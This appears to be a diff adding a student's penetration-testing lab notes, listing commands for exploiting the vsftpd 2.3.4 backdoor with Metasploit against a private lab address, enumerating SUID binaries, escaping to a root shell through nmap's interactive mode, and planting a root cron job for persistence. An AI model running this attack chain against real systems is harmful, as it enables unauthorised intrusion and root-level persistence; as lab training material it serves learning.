@@ -1,0 +1,22 @@
+# Task 03 - Important Commands Used
+
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.75.131
+run
+
+id
+whoami
+
+chmod +x linpeas.sh
+./linpeas.sh
+
+find / -perm -4000 -type f 2>/dev/null
+
+ls -l /usr/bin/nmap
+nmap --interactive
+!sh
+
+echo "* * * * * root /bin/bash -c 'echo PERSIST_OK >> /tmp/persist.txt'" > /etc/cron.d/persist_lab
+chmod 644 /etc/cron.d/persist_lab
+cat /tmp/persist.txt
